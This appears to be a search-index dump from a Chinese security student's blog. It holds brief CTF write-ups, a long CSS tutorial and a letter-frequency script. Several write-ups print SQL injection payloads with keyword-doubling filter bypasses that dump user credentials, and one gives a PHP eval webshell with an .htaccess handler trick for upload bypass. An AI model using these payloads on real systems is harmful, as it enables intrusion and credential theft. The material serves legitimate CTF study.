dog","text":"拿到题目是张图片，binwalk分离出一个txt打开txt文件发现是aaencode加密到这里我遇到的坑出来了，对aaencode解密可以使用控制台解密，但是解密出来的是然后又看了这道题，把所有的jpg隐写的方法都试了一遍还是没有flag。最后其实就是aaencode解密，以前遇到的是直接alert()出来flag，但是这个题不一样，需要找到在线网站解密。aaencode解密网址用这个网站解码出来：得到flag。","link":"/2-8-SUCTF2018-single-dog.html"},{"title":"2.7 [极客大挑战 2019]Knife&LoveSQL&Http","text":"Knife题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。 LoveSQL简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。payload：12345678and 1=1 --+and 1=2 --+order by 3 --+union select 1,2,3 --+union select 1,database(),version() --+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(':',username,password)) from users --+)将对应的表名换成题目中的表名即可 Http这道题目主要考察http头部信息的理解和利用。首先查看源码找到Secret.php接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。","link":"/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html"},{"title":"2.7 [SUCTF 2019]Game","text":"查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。接着在图片中寻找，找到一个des加密的字符串：U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==DES加密的字符串都是以U2FsdGVkX1开头的。用在线网站解码des，使用3DES解码：密码为假的flag得到flag：flag{U_F0und_1t}","link":"/2-7-SUCTF-2019-Game.html"},{"title":"2.8 [SUCTF2018]followme","text":"查看流量包：发现数据包有很多http协议，直接导出http对象。仔细分析后发现：这个是爆破admin密码的流量，找到爆破密码的地方，一个一个查看password字段的值，得到flag","link":"/2-8-SUCTF2018-followme.html"},{"title":"2.8 [极客大挑战 2019]BuyFlag&BabySQL","text":"BuyFlag查看网页源代码找到一处php代码：抓包查看：将user=1然后绕过is_numeric函数，通过%00截断绕过。然后需要money字段，用到数组绕过。payload：1password=404%00&amp;money[]=100000000 BabySQL通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。使用的payload：12345678查询表名admin&amp;password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23查询字段名admin&amp;password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23查询字段内容username=admin&amp;password=admi' uniunionon selselectect 1,group_concat(concat_ws(':',username,passwoorrd)),3 frofromm b4bsql --+","link":"/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html"},{"title":"2020_2月总结","text":"Hey, password is required here. 6cc52367ac4ba55a89d8bcdea23e0ced3ab7a32282ef7962620f1625d9959dc1b96013a9c79e5584042ba454b9d2950228f18ca4ecddbd7e05a7ce26c4f7d34e3a84f814c24b1812fb180e5e137653233172e35c773fbfb8393b6d8e1b7f250728ec306468404de2c5a475db103c7729d0cb063ee43cac5b64922c91f21436c28cb2a3c93134bb219dd06cd1d667a921f8d0ac1f1a0e71e129d1871e29db27c02a7a7e0b00a18e4050a9ecadd382def09b988d840bb3c49b07bd0328b848709ed1e5f2dde3cae4d29e289a6e53cb2cd8a16cfcc27eb9a0edc4afa5faa575879610edb174671a51ad44df87219189f78bd0c1f5bd62417e13826ffd3aa63bb0ec61b9a4cfa06cdc573b512bd64d983d908aeef243aefd3665e63f952552430f8e3ddf382c15f55192607263b2956774348c2f7f60dbdfff8b089a574c109ccd553ca32d4835fd4043bd0c8148d3585777c9c3bb9bc441a94ae3976b7b870e28cd34ab249d8dc3ad818622c4765e14029d7c093ba1c166d06928d31b67afcec3e6c99e3c9d88815d08c557613651878112b97fe05b813832c94f78e737f4e9746206ade9e98c33ba5ac636a1c5611dacc6be585b7a7143d4999a9009fef3e9b5e56b2fdf014fbe570ad21434474e6eb13d64d20bf8f2a942a6598de7793de252a268635638764b3df84e4d3cfbd97adae190b3338a951200e19fea688de68c7c39d5d4677069b40e8d3f6676c44293faeb20ddfd5c671ad535a01417343cd15efb6816c571c8b9e83d9258e302616b498b93c8888f27ac4a65ca53481cedeba2fb1b216502475bfc1a2e0a5e87950cd4910dc8546cec32feb782bd13c0fa68e9c29c2aa3bb19bee109635b49f206f5ca3c4a02131ece94a421b5426f91ea01a3e5b14baca90f25d6d824c8c55c76e7d82edcb8a113a857d870c0235e81add1d85993b106f9d138319b8cab2a334652c367c5c5191283c34de0daaa76c1b0238c18e9e9e1a8d0e698506892ec4881fa3eac9436cdbd86a7f4187da999b89a2701a8138aada960d03b53e96ae030e2030797b4e9938b0826624848d89b501c880c3db82228cf4dc376891de9dc2b31b7ef85caa8acd782a704eb4c8cb28028ab0c05d4d42196bb58f72ca1c365e03f41ebe18dcf2a959d7fd6011893e0bcf084881e4ee0571c678d3db2bd24b8cf1b704194bf7bde072c8f83bf73671a525cc16534a4126d3dce472d9d8e664ea3055579349534cd0b85e2476220d05e554eb3b4cbb58b405103cac8f6a1fb62f095e63b1ed0661b4eb9bc700bf88c009a86510b4610f2a799f6e0748b112fae18db4afbe5b75ce163492e604b725db2baaec2d06864751d1cef111ec048ab878585318ffaead9839d482a804869ffdf65d1e87ffd156cc15612d41616badaefa4645bc072bc375a9600767fe5da453a3fd5ff45ea9ac862db3cb5b316627df88edaaea44c590011ffe708c9b1ae6f2e07fe62c4aced5d5be59191945b36fb549ba8afb3cc6f4cc2e5f1874bdac8d55e6366f1b003069321e56cf7fed9e9ade6b7ba69d2882dc8799e661798fa6a7e292eeec7b18984de389f58b74487d873c9f31200b4ba7c340b98e7148a0a48020b68f529abc6c6b71850609bd00e393907374a911dc207dd207974aa74b2c73da1008e44e2161af80fcc1af1ade1b378132804d42be5e113415b02d75078ab70f0fec444f25af34e9185ef7ccb491de1aac1f4915fda41442c86b4c2967aaefc979d1031c14613c4031e5074573add17c62ad720aeb67e3f82e199d0935281a60cfa8ccbe302b6d721ef139e72f3199614e9195b87d57e80aac2531e0816bea8f50fb74e8728751fdc32801ad61543929450703f6032db221e7a6e85dbbe421f16b99d8a2e2aa7bf641aaa84bf7caeb5c257fe548399e41b09c0c600522f7fbf99530517b65bbb738e5c75cb66950f24701883e8e10150be55e42037cbd39ddfb188c37d216c6f0feff2712ecec57ac1f47006a54e9d95ebbb391e3e645ba26112420b2fcf198c10b6adcf13741b902ea7e84138604aa1b8fb61db43537479eb71b6373d411f","link":"/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html"},{"title":"2.9 [QCTF2018]Noise","text":"这道题脑洞比较大，也出现很多新的知识点，以此记录一下。首先题目给了一个wav文件，是《my little pony theme song》。根据题目提示要消除BGM，得到人声。消除BGM的方法：所以我们要找到原曲，将原曲的相位翻转180度即可。这里使用的软件为：Adobe Audition得到处理后的文件.wav然后听一下是电信号，这里用到了慢扫描电视的知识点。参考文章：https://zhuanlan.zhihu.com/p/105460358这里使用的是mmsstv工具，首先要先将得到wav录制成mmsstv识别的mmv文件，工具自带了录声音功能。最后得到flag： 用到的知识点：怎么去掉BGM慢扫描电视","link":"/2-9-QCTF2018-Noise.html"},{"title":"[GXYCTF2019]BabyUpload","text":"上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&lt;?开头的小马。1234567php小马&lt;script language=&quot;php&quot;&gt; eval($_POST[&quot;Da4er&quot;])&lt;/script&gt;.htaccess&lt;FilesMatch &quot;png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;","link":"/GXYCTF2019-BabyUpload.html"},{"title":"CSS基本学习(一)","text":"比赛打完了，开始学习学校的课程了，以此记录学习. 一.CSS基本语法选择器{属性1:属性值1;属性2:属性值2;….}每条CSS包括两部分组成:选择器和一条或多条属性声明。每条属性声明由一个属性和一个值组成。属性和值之间用冒号，多条属性之间用分号。将多条属性放到一个花括号中。1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p{ text-align: center; color: blue; font-family: &quot;Comic Sans MS&quot;,arial,黑体; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;使用css定义网页段落水平对齐方式，文体颜色和字体&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;注意:在定义css属性值时，如果时多个单词组成要加引号，单个单词不需要加引号. 二.CSS基本选择器CSS选择器包括俩种基本选择器和复合选择器，基本选择器主要包括元素选择器，类选择器，id选择器，伪类选择器，伪元素选择器；复合选择器是通过基本选择器进行组合构成的。 1.元素选择器基本语法：html元素名{属性1：属性值1；属性2：属性值2；…..}元素选择器对指定的html元素全部显示效果。123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p{ text-align: center; color: blue; font-family: &quot;Comic Sans MS&quot;,arial,黑体; } h1{ text-align: center; color: red; } h2{ text-align: center; color: green; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;使用css定义网页段落水平对齐方式，文体颜色和字体&lt;/p&gt;&lt;h1&gt;css对h1定义颜色&lt;/h1&gt;&lt;h2&gt;css对h2定义颜色&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 2.类选择器元素选择器是对页面中的所有相同元素的统一格式，但如果需要对相同元素的某一个元素做特殊效果，我们就需要类选择器或者id选择器。基本语法：.类选择器{属性1：属性值1；属性2：属性值2；}语法说明：类选择器第一个字符不能使用数字，类选择器名前的”.”是类选择器的标识，不能省略，类选择器区分大小写。应用类选择器样式的元素中添加”class”属性，且将其值设置为类选择器名。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ .txt1{ color: blue; font-size: 26px; font-style: 黑体; } .txt2{ color: red; font-style: italic; font-size:30px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;txt1&quot;&gt;使用txt1类选择器显示效果&lt;/p&gt;&lt;p class=&quot;txt2&quot;&gt;使用txt2类选择器显示效果&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;需要注意的是类选择器的优先级高于元素选择器，所有对一个元素即使用元素选择器，又使用类选择器，最后显示的效果是类选择器定义的效果。 3.ID选择器ID选择器和类选择器一样，都是对页面相同元素特定的一个元素进行特殊效果处理。基本语法：#ID选择器名{属性1：属性值1；属性2：属性值2；…..}在应用ID选择器时，在元素添加id属性，属性值为id选择器名。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ #txt1{ color: blue; font-size: 26px; font-style: 黑体; } #txt2{ color: red; font-style: italic; font-size:30px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=&quot;txt1&quot;&gt;使用txt1类选择器显示效果&lt;/p&gt;&lt;p id=&quot;txt2&quot;&gt;使用txt2类选择器显示效果&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;id选择器优先级同样优先元素选择器 4.通用选择器通用选择器用通配符”“ 表示，它可以选择文档中所有元素。主要用于重置文档元素默认样式，一般用来重置文档元素的内外边距。基本语法:{属性1：属性值1；属性2：属性值2；}123*{margin:0px; padding:0px;} 5.伪类选择器CSS伪类用于向某些选择器添加特殊效果，伪类一开始用来表示一些元素的动态效果，典型的就是链接的各个状态。基本语法：选择器名:伪类{属性1：属性值1；属性2：属性值2；…..}语法说明：选择器可以是任意类型的选择器，当选择器是类选择器时，可以在类选择器名前加上元素名，即将选择器名写成：元素名.类选择器名，比如：a.second:link伪类类型：:active //将样式添加到被激活的元素:hover //当鼠标悬浮在元素上方时，向元素添加样式:link //将样式添加到未被访问过的链接:visited //将样式添加到已被访问过的链接:first-child //将样式添加到元素的第一个子元素:lang //向带有指定lang属性的元素添加样式 (1).对链接定义显示效果1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ a:link{ color: blue; } a:visited{ color: red; } a:hover{ color: green; } a.second:link{ color: #00f; font-size: 26px; } a.second:visited{ color: #f00; font-size: 26px; } a.second:hover{ color:#0f0; font-size: 26px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;超链接1&lt;/a&gt;&lt;a href=&quot;https://da4er.top&quot; class=&quot;second&quot;&gt;超链接2&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; (2).元素选择器使用伪类1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ input:focus{ background-color: yellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;#&quot; method=&quot;post&quot;&gt; 用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt; 密码:&lt;input type=&quot;password&quot; name=&quot;psw&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;1&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; (3).使用伪类设置元素的第一个子元素的样式12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p:first-child{ font-size: 33px; } li:first-child{ color: red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;段落1，其顶层元素是boby&lt;/p&gt;&lt;p&gt;段落2，其顶层元素是boby&lt;/p&gt;&lt;div&gt; &lt;p&gt;段落1，其顶层元素是div&lt;/p&gt; &lt;p&gt;段落2，其顶层元素是div&lt;/p&gt;&lt;/div&gt;&lt;ol&gt; &lt;li&gt;有序列表项1，其顶层元素是ol&lt;/li&gt; &lt;li&gt;有序列表项2，其顶层元素是ol&lt;/li&gt;&lt;/ol&gt;&lt;/body&gt;&lt;/html&gt; (4).伪类设置带有lang属性的元素1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ q:lang(no){ font-size: 33px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;q lang='no'&gt;11111&lt;/q&gt;&lt;/p&gt;&lt;p&gt;&lt;q&gt;11111&lt;/q&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 6.伪元素选择器CSS伪元素用于将特殊的效果添加到某些选择器。基本语法：选择器名：伪元素{属性1：属性值1；属性2：属性值2；….}语法说明：和伪类选择器一样，为了限定某类元素，也可以在类选择器名前加上元素名。所以选择器名写成：元素名.类选择器名。在CSS3中，为了区分两者，规定伪类用一个冒号来表示，伪元素用两个冒号表示。伪元素类型：:first-letter //向文本的第一个字符添加特殊样式:firs-line //向文件的首行添加特殊样式:before //在元素之前添加内容:after //在元素之后添加内容1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p:first-line{ font-size: 26px; font-style: italic; text-decoration: underline; } p:first-letter{ font-size: 50px; } p:before{ content: url(1.jpg); } p:after{ content: url(1.jpg); }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;https://da4er.top&lt;br&gt;https://da4er.top&lt;br&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 三.CSS复合选择器复合选择器是通过基本选择器进行组合构成的，常用的复合选择器有：交集选择器，并集选择器，属性选择器，后代选择器，子元素选择器和相邻元素选择器等。 1.交集选择器交集选择器由俩个选择器构成，第一个选择器必须是元素选择器，第二个选择器是类选择器或者id选择器。交集选择器的作用范围将选中同时满足前后俩个选择器定义的元素，也就是要求前者定义的元素，同时必须是指定了后者的类别或者id。该元素的样式是：第一个选择器，第二个选择器，交集选择器层叠的效果。基本语法：元素选择器.类选择器|#ID选择器{属性1：属性值1；属性2：属性值2；….}1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ div{ border-style: solid; border-width: 10px; border-color: blue; margin: 20px; } .al{ font-style: italic; background: #33ffcc; } div.al{ border-color: red; background: #999999; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;元素选择器的效果&lt;/div&gt;&lt;div class=&quot;.al&quot;&gt;交集选择器的效果&lt;/div&gt;&lt;p class=&quot;.al&quot;&gt;类选择器的效果&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 2.并集选择器并集选择器又叫分组选择器，对不同选择器进行同种效果的展示，极大地减少了css代码量基本语法：选择器1，选择器2，选择器3,…..{属性1：属性值1；属性2，属性值2；…..}1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ div{ border-style: solid; border-width: 10px; border-color: blue; } h1,h2,div{ background: #999999; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Da4er&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;Da4er&lt;/h2&gt;&lt;br&gt;&lt;div&gt;Da4er&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 3.属性选择器根据元素的属性及属性值来选择元素，此时用到的选择器称为属性选择器。基本语法：[属性选择器1][属性选择器2]{属性1：属性值1；属性2：属性值2；…..}元素选择器[属性选择器1][属性选择器2]{属性1：属性值1；属性2：属性值2；…..}属性选择器格式：1.[属性] 用于选取带有指定属性的元素2.[属性=值] 用于选取带有指定属性和值的元素3.[属性|=值] 用于选取属性值以指定开头的元素，注意该值必须是一个完整的单词或带有”-“作为连接符连接后续内容的字符串。4.[属性^=值] 用于选取属性值以指定值开头的元素5.[属性$=值] 用于选取属性值以指定值结尾的元素6.[属性*=值] 用于选取属性值中包含指定值的元素7.[属性~=值] 用于选取属性值中包含指定值的元素，注意该值必须是一个完整的单词123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ [title]{ color: red; } img[alt]{ border:30px #ff0000 solid; } p[align=&quot;center&quot;]{ color: blue; font-weight: bolder; } a[title][href]{ color: green; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p title=&quot;1&quot;&gt;Da4er&lt;/p&gt;&lt;br&gt;&lt;p align=&quot;center&quot;&gt;Da4er&lt;/p&gt;&lt;br&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;dog&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://da4er.top&quot; title=&quot;blogs&quot;&gt;blogs&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 4.后代选择器又称包含选择器，用于选择指定元素的所有后代元素。基本语法：选择器1 选择器2 选择器3….{属性1：属性值1；属性2：属性值2；….}后代选择器按从右到左的顺序读选择器的方式，例如 div h1 表示h1作为div的后代，也可以表示为div后代元素的任意h2元素。123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ div{ margin: 20px; line-height: 36px; } div.s{ float: left; padding-right: 10px; border-right: #ccc 1px solid; } div.m{ float: left; } div.s a:link{ color: #000; text-decoration: none; } div.m a:link{ color: #00f; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class='s'&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt;&lt;/div&gt;&lt;div class='m'&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.子元素选择器基本语法：选择器1&gt;选择器2{属性1：属性值1；属性2：属性值2；…..}选择器1&gt;选择器2 表示选择器1子元素的所有选择器2元素123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ h3&gt;span{ color: red; }&lt;/style&gt;&lt;/head&gt;&lt;div&gt; &lt;h3&gt;&lt;span&gt;Da4er&lt;/span&gt;&lt;/h3&gt; &lt;h3&gt;Da4er&lt;/h3&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 6.相邻兄弟选择器选择紧接在另一个元素的元素，而且二者有相同的父类基本语法：选择器1+选择器2{属性1：属性值1；属性2：属性值2；….}123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ h1+p{ color: red; font-weight: bold; } p+p{ color: blue; font-weight: bold; }&lt;/style&gt;&lt;/head&gt;&lt;h1&gt;Da4er&lt;/h1&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 四.CSS常用属性1.文本属性定义文本外观，修改文本的颜色，行高，对齐方式，字符间距，段首缩进位置等属性以及修饰文本等功能。常用文本属性： | 文本属性 |属性值 |描述 | | color |命名颜色，十六进制，RGB |文本颜色 || text-indent |length(常用单位px) |文字的首行缩进距离 || line-height |length(常用单位px) | 定义行高 || text-decoration |underline，overline，line-through，none|下划线，上划线，删除线，无任何修饰 || text-align |left，center，right，justify |左对齐，居中对齐，右对齐，两端对齐 || text-transform |none，uppercase，lowercase，capitalize |默认值，将文本中的字母转换大写，转换为小写，每个单词首字母大写，空白会被浏览器忽略 || white-space|normal，pre，nowrap，pre-wrap，pre-line，inherit |默认值(空白被浏览器忽略)，空白被浏览器保留，文本不换行(直到遇到)，保留空白符序列，合并空白符序列，继承white-space || word-spacing |length |设置汉字或单词之间的空格的宽度 |1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ #text1{ color: #03f; letter-spacing: 6px; line-height: 37px; text-decoration: underline; text-indent: 2em; } #text2{ text-align: center; white-space: pre-wrap; text-transform: lowercase; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p id=&quot;text1&quot;&gt;Da4er&lt;/p&gt; &lt;p id=&quot;text2&quot;&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 2.字体属性| 属性 |属性值 |描述 | | font |除了font之外的其他字体属性值 |把所有针对字体的属性设置放在一个声明中 || font-size |xx-small，smaller，larger，length，% |绝对字体尺寸(默认值为medium)，相对字体尺寸(设置比父元素更小的尺寸)，相对字体尺寸(设置比父元素更大的尺寸)，设置字体大小为基于父元素的一个百分数 ||font-family |宋体，黑体 |设置字体族，优先级按字体族顺序从大到小 || font-weight |normal，lighter，bold，bolder |设置字体常规格式显示，设置字体加细，设置字体加粗，设置字体特粗 || font-style |normal，italic，oblique |字体常规格式显示，字体斜体显示，字体斜体显示 |12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p{ font-family: &quot;楷体&quot;,&quot;宋体&quot;; font-size: 5em; font-weight: 500; font-style: italic; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 3.背景属性| 属性 |属性值 |描述 | | background | 除background之外的任何的背景属性值 |将背景属性设置在一个声明中 || background-color |颜色值 |设置元素的背景颜色 || background-image |url(image_file_path) |设置元素的背景图像 || background-position |left，right，center，top，bottom |背景图像左，右，中，上，下对齐 ||background-attachment |scroll，fixed，inherit |设置背景图像是固定亦随着页面滚动，默认是滚动 |1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ body{ background-image: url(1.jpg); background-attachment: fixed; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 4.列表属性| 属性 |属性值 |描述 | |list-style |其他任意的列表属性值 |用于把所有用于列表的属性设置于一个声明中 || list-style-image |image_url |将图片设置为列表项前导符 || list-style-type |disc，circle，square，decimal，lower-roman，upper-roman，lower-alpha，upper-alpha，none |列表项前添加实点圆点，空心圆点，实心方块，普通的阿拉伯数字，小写罗马数字，大写罗马数字，小写英文字母，大写英文字母，不添加任何项目符号或编号 | 五.html文档中应用CSS1.行内式基本语法：&lt;标签名 style=”属性1：属性值1；属性2：属性值2；….”&gt; 2.内嵌式基本语法：1&lt;style type=&quot;text/css&quot;&gt; CSS样式 &lt;/style&gt; 3.链接式基本语法：1&lt;link rel=&quot;stylesheet&quot; type=&quot;type/css&quot; href=&quot;css文件&quot; /&gt; 4.导入式基本语法：1&lt;style type=&quot;text/css&quot;&gt; @import url(&quot;CSS样式文件名&quot;)；&lt;/style&gt; 六.CSS的冲突与解决当文件中有多个css对同一个元素进行不同格式设置，会出现css的冲突。解决原则:(1)优先级原则 (2)最近原则 (3)同一个属性的样式定义优先级的规定为:行内式样式&gt;内嵌式样式|链接外部样式 行内式样式的优先级最高 内嵌式样式和链接外部样式的优先级由它们出现的位置决定，谁出现在后面，谁的优先级就高。ID选择器的优先级最高。","link":"/CSS%E5%9F%BA%E6%9C%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80.html"},{"title":"[GXYCTF2019]gakki","text":"先binwalk分离图片的压缩包：得到的压缩包有密码，尝试爆破。看到flag.txt有很多字符，想到字符频率，用脚本或者HxD查看都可以。附上解题脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding: UTF-8 -*-def processLine(line, CharacterCounts): for character in line: #if ord(character) in range(97, 123): if ord(character) in range(32,126): CharacterCounts[character] += 1 #创建字母字典def createCharacterCounts(CharacterCounts): #for i in range(97, 123): for i in range(32, 126): CharacterCounts[chr(i)] = 0 def main(): #用户输入一个文件名 # filename = input(&quot;enter a filename:&quot;).strip() filename = &quot;flag.txt&quot; infile = open(filename, &quot;r&quot;) #建立用于计算词频的空字典 CharacterCounts = {} #初始化字典键值 createCharacterCounts(CharacterCounts) for line in infile: #processLine(line.lower(), CharacterCounts) processLine(line, CharacterCounts) #从字典中获取数据对 pairs = list(CharacterCounts.items()) #列表中的数据对交换位置,数据对排序 items = [[x,y] for (y,x) in pairs] items.sort(reverse=True) #输出count个数词频结果 for i in range(len(items)): #print(items[i][1]+&quot;\\t&quot;+str(items[i][0])) print(items[i][1],end='') infile.close() if __name__ == '__main__': main()","link":"/GXYCTF2019-gakki.html"},{"title":"Java学习笔记","text":"Hey, password is required here. 